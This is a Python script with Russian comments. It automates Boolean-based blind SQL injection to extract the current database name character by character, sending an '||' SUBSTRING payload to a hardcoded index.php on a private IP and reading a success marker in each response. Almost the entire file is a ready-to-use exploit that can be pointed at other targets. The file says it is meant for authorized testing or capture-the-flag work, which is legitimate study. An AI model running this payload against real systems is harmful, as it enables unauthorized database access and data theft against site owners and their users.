"""
=============================================================================
 perebor_name_bd_Boolean-Based Blind.py — Boolean-Based Blind SQLi: имя БД
=============================================================================

ЗАЧЕМ:
    Посимвольно извлекает имя текущей базы (database()) через БУЛЕВУ слепую
    инъекцию — без SLEEP. Признак «символ верный» — появление в ответе маркера
    "under consideration" (условие true меняет содержимое страницы).

ГДЕ ПРИМЕНИМО:
    Слепая SQLi, где по ответу различимы состояния true/false (разный текст),
    но данные напрямую не выводятся. Быстрее Time-Based, т.к. нет задержек.

ЗАПУСК:
    python3 "perebor_name_bd_Boolean-Based Blind.py"

ОГРАНИЧЕНИЯ / ЗАМЕЧАНИЯ:
    - ЗАХАРДКОЖЕНО: url, параметр 'check', предполагаемая длина length=8,
      маркер "under consideration". Замените под свою цель/приложение.
    - Payload использует оператор '||' (конкатенация/OR) — подберите синтаксис
      под конкретную инъекцию (кавычка, оператор, комментарий).
    - Только для авторизованного тестирования / CTF.
=============================================================================
"""
import requests

url = "http://172.23.24.164/index.php"
db_name = ""
length = 8  # Предполагаемая длина имени БД

# Возможные символы в имени БД (можно расширить)
charset = "abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"

for pos in range(1, length + 1):
    for char in charset:
        # Boolean-Based инъекция (без SLEEP)
        payload = f"9999' || SUBSTRING(database(),{pos},1)='{char}' -- -"
        data = {"check": payload}
        
        response = requests.post(url, data=data)
        
        # Проверяем, содержит ли ответ "under consideration" (условный маркер успеха)
        if "under consideration" in response.text:
            db_name += char
            print(f"Найден символ {pos}: {char} → Текущее имя: {db_name}")
            break
    #else:
        # Если ни один символ не подошел, возможно, достигнут конец имени
    #    print(f"Символ на позиции {pos} не найден. Возможно, длина имени меньше.")
    #    break

print(f"Имя БД: {db_name}")
